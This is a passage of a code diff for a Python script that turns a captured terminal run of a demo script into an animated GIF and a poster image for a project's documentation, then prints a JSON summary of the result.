+        "hero_small": ImageFont.truetype(str(sans_path), 42),
+        "subtitle": ImageFont.truetype(str(sans_path), 19),
+        "body": ImageFont.truetype(str(sans_path), 17),
+        "sans_small": ImageFont.truetype(str(sans_path), 14),
+        "tiny": ImageFont.truetype(str(sans_path), 12),
+    }
 
 
 def main() -> None:
-    scenes, evidence = collect_scenes()
+    command, transcript, return_code = capture_live_demo()
+    pages = transcript_pages(command, transcript)
     output = ROOT / "docs" / "assets" / "judikt-demo.gif"
     poster = ROOT / "docs" / "assets" / "judikt-demo-poster.png"
-    duration_ms = render_recording(scenes, output, poster)
-    report = {
-        "context_chapters": len(INFO_SLIDES),
-        "execution_flow_chapters": 2,
-        "scenes": len(scenes),
-        "major_hold_seconds": MAJOR_HOLD_MS / 1000,
-        "duration_seconds": round(duration_ms / 1000, 1),
-        "audit_valid": evidence["audit_integrity"]["valid"],
-        "signed_events": evidence["audit_integrity"]["checked_events"],
-        "gif": str(output.relative_to(ROOT)),
-        "gif_bytes": output.stat().st_size,
-        "poster": str(poster.relative_to(ROOT)),
-        "poster_bytes": poster.stat().st_size,
-    }
-    print(json.dumps(report, indent=2))
+    duration_ms = render_recording(command, pages, output, poster)
+    print(
+        json.dumps(
+            {
+                "format": "hybrid explainer slides plus captured terminal stdout",
+                "terminal_source": "captured stdout from ./scripts/run_demo.sh",
+                "process_exit_code": return_code,
+                "explainer_slides": len(INFO_SLIDES) + 4,
+                "terminal_pages": len(pages),
+                "major_hold_ms": MAJOR_HOLD_MS,
+                "duration_seconds": round(duration_ms / 1000, 1),
+                "target_duration_seconds": TARGET_DURATION_MS / 1000,
+                "gif": str(output.relative_to(ROOT)),
+                "gif_bytes": output.stat().st_size,
+                "poster": str(poster.relative_to(ROOT)),
+            },
+            indent=2,
+        )
+    )
 
 
 if __name__ == "__main__":
